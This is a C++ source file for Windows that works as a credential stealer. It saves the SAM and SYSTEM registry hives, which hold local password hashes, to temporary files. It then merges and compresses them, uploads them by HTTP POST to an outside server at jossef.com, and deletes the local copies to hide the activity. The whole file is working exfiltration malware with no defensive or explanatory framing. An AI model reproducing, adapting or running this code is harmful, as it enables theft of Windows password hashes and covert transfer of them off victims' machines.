#include "helpers.h"
#define SERVER "jossef.com"
#define UPLOAD_URL "/mailer/sendmail.php"

int main()
{
	auto tempPath = getTempPath();

	int exitCode = 0;

	// -------------------
	// SAM

	auto samFilePath = join({ tempPath, "sam.dump" });
	exitCode = execute({ "reg", "save", "hklm\\sam", samFilePath, "/y" });

	if (exitCode == S_OK)
	{
		cout << "Exported SAM Successfully to " << samFilePath << endl;
	}
	else
	{
		cout << "Failed to export SAM" << endl;
		return S_FALSE;
	}


	// -------------------
	// SYSTEM

	auto systemFilePath = join({ tempPath, "system.dump" });
	exitCode = execute({ "reg", "save", "hklm\\system", systemFilePath, "/y" });

	if (exitCode == S_OK)
	{
		cout << "Exported SYSTEM Successfully to " << systemFilePath << endl;
	}
	else
	{
		cout << "Failed to export SYSTEM" << endl;
		return S_FALSE;
	}

	// -------------------
	// Sending Files

	vector<BYTE> samFileData;
	readFile(samFilePath, samFileData);

	vector<BYTE> systemFileData;
	readFile(systemFilePath, systemFileData);

	vector<BYTE> data;

	std::vector<BYTE> separatorData;
	const char* separator = "##############################################################";
	separatorData.assign(separator, separator + strlen(separator));

	data.reserve(separatorData.size() + samFileData.size() + systemFileData.size());
	data.insert(data.end(), samFileData.begin(), samFileData.end());
	data.insert(data.end(), separatorData.begin(), separatorData.end());
	data.insert(data.end(), systemFileData.begin(), systemFileData.end());

	// -------------------
	// Compress (Optional)

	auto compressedFilePath = join({ tempPath, "data.gz" });
	compress(data, compressedFilePath);

	data.clear();
	readFile(compressedFilePath, data);


	// -------------------
	// Upload

	cout << "Uploading " << data.size() << endl;
	postHTTP(SERVER, UPLOAD_URL, data);

	// -------------------
	// Remove files

	exitCode = execute({ "del", compressedFilePath });
	exitCode = execute({ "del", samFilePath });
	exitCode = execute({ "del", systemFilePath });

	return S_OK;
}


int CALLBACK WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
	)
{
	return main();
}